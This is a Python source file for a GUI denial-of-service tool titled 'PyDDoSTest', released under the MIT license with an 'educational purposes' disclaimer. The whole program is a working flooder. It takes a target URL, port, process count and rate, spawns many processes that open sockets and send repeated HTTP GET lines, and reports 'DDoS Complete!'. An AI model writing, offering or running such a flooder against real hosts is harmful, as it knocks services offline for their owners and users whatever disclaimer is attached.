'''
Note: Made by @phoomparin for Educational Purposes. use as you wish! :)

The MIT License (MIT)

Copyright (c) 2015 Phoomparin Mano

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
'''

import requests, os, sys, string, socket, threading, math, multiprocessing
from tkinter import *
from tkinter import ttk
from tkinter import messagebox
from tkinter import Text

def writeToLog(msg):
    numlines = output_box.index('end - 1 line').split('.')[0]
    output_box['state'] = 'normal'
    if numlines == 24:
        output_box.delete(1.0, 2.0)
    if output_box.index('end-1c')!='1.0':
        output_box.insert('end', '\n')
    output_box.insert('end', msg)
    output_box['state'] = 'disabled'

def flood(url, instance, msg, rate, port):
	try:
		conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		conn.connect((url, int(port),))
		for i in range(0, int(rate)):
			conn.send(("GET /" + str(msg) + " HTTP/1.1\r\n").encode())
			writeToLog("[+] SOCKET OK: INST%s/RATE%s" % (str(instance), str(i)))
		conn.close()
	except Exception as e:
		writeToLog("[!] SOCKET EXCEPTION: %s" % e)
	else:
		writeToLog("[+] INSTANCE %s OK" % str(instance))

def attack(url, instance, msg, rate, port):
	try:
		conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		conn.connect((url, int(port),))
		conn.close()
	except:
		pass
		writeToLog("[!] CONNECTION EXCEPTION")
		messagebox.showwarning("CONNECTION EXCEPTION", "CONNECTION EXCEPTION");
	else:
		writeToLog("[+] CONNECTION ATTEMPT OK")
		try:
			for i in range(0, int(instance)):
				p = multiprocessing.Process(target=flood, args=(url, i, msg, rate, port,))
				p.start()
				writeToLog("[+] INSTANCE INIT: %s" % str(i))
		except Exception as e:
			pass
			writeToLog("[!] INSTANCE EXCEPTION: %s" % str(e))
		else:
			writeToLog("[+] INSTANCE OK")
			messagebox.showinfo("OK", "DDoS Complete!")

def run(e):
	writeToLog("[+] GUI Invoked")
	writeToLog("[+] URL: %s" % input_url.get())
	writeToLog("[+] PORT: %s" % input_port.get())
	writeToLog("[+] INSTANCE: %s" % input_instance.get())
	writeToLog("[+] RATE: %s" % input_rate.get())
	writeToLog("[+] MESSAGE: %s" % input_message.get())
	try:
		#URL Input
		url = input_url.get()
		if url == "":
			raise ValueError("URL CANNOT BE BLANK!")
		#PORT Input
		port = input_port.get()
		if port == "":
			raise ValueError("PORT CANNOT BE BLANK!")
		if port.isdigit() == False:
			raise ValueError("PORT MUST BE A NUMBER!")
		if int(port) <= 0:
			raise ValueError("PORT CANNOT BE LESS THAN 0!")
		#INSTANCE Input
		instance = input_instance.get()
		if instance == "":
			raise ValueError("INSTANCE CANNOT BE BLANK!")
		if int(instance) <= 0:
			raise ValueError("INSTANCE CANNOT BE LESS THAN 0!")
		if instance.isdigit() == False:
			raise ValueError("INSTANCE MUST BE A NUMBER!")
		#RATE Input
		rate = input_rate.get()
		if rate == "":
			raise ValueError("RATE CANNOT BE BLANK!")
		if rate.isdigit() == False:
			raise ValueError("RATE MUST BE A NUMBER!")
		if int(rate) <= 0:
			raise ValueError("RATE CANNOT BE LESS THAN 0!")
		#MESSAGE Input
		msg = input_message.get()
		if msg == "":
			raise ValueError("MSG CANNOT BE LEFT BLANK! SAY SOMETHING!")
	except ValueError as e:
		pass
		validate_error = "ERROR: " + str(e)
		writeToLog("[!] " + str(validate_error))
		messagebox.showwarning(message=validate_error)
	else:
		attack(url, instance, msg, rate, port)
		pass

if __name__ == '__main__':
	root = Tk()
	root.title("PyDDoSTest GUI By Phoomparin")

	mainframe = ttk.Frame(root, padding="3 3 12 12")
	mainframe.grid(column=0, row=0, sticky=(N, W, E, S))
	mainframe.columnconfigure(0, weight=1)
	mainframe.rowconfigure(0, weight=1)

	input_url = StringVar()
	input_port = StringVar()
	input_instance = StringVar()
	input_rate = StringVar()
	input_message = StringVar()

	ttk.Label(mainframe, text="URL: ").grid(column=1, row=1, sticky=E)
	url_entry = ttk.Entry(mainframe, width=21, textvariable=input_url)
	url_entry.grid(column=2, row=1, sticky=(W, E))

	ttk.Label(mainframe, text="PORT: ").grid(column=1, row=2, sticky=E)
	port_entry = ttk.Entry(mainframe, width=4, textvariable=input_port)
	port_entry.grid(column=2, row=2, sticky=(W, E))

	ttk.Label(mainframe, text="INSTANCE: ").grid(column=1, row=3, sticky=E)
	instance_entry = ttk.Entry(mainframe, width=4, textvariable=input_instance)
	instance_entry.grid(column=2, row=3, sticky=(W, E))

	ttk.Label(mainframe, text="RATE: ").grid(column=1, row=4, sticky=E)
	rate_entry = ttk.Entry(mainframe, width=4, textvariable=input_rate)
	rate_entry.grid(column=2, row=4, sticky=(W, E))

	ttk.Label(mainframe, text="MESSAGE: ").grid(column=1, row=5, sticky=E)
	message_entry = ttk.Entry(mainframe, width=4, textvariable=input_message)
	message_entry.grid(column=2, row=5, sticky=(W, E))

	ttk.Label(mainframe, text="LOG: ").grid(column=1, row=6, sticky=E)
	output_box = Text(mainframe, state=DISABLED, width=40, height=10)
	output_box.grid(column=2, row=6, sticky=W)
	scrollbar = ttk.Scrollbar(mainframe, command=output_box.yview)
	scrollbar.grid(column=3, row=6, sticky='nsew')
	output_box['yscrollcommand'] = scrollbar.set

	ttk.Label(mainframe, text="This program is created by Phoomparin @ phoomparin.com ").grid(column=2, row=7, sticky=E)

	ttk.Button(mainframe, text="Start", command=lambda: run(None)).grid(column=2, row=8, sticky=W)

	for child in mainframe.winfo_children(): 
		child.grid_configure(padx=5, pady=5)

	writeToLog("[+] Program created by Phoomparin")
	writeToLog("[+] Educational usage only. Use at your own risk.")
	writeToLog("[+] Note: We recommended instance number to be under 150!")

	url_entry.focus()
	root.bind('<Return>', run)
	root.mainloop()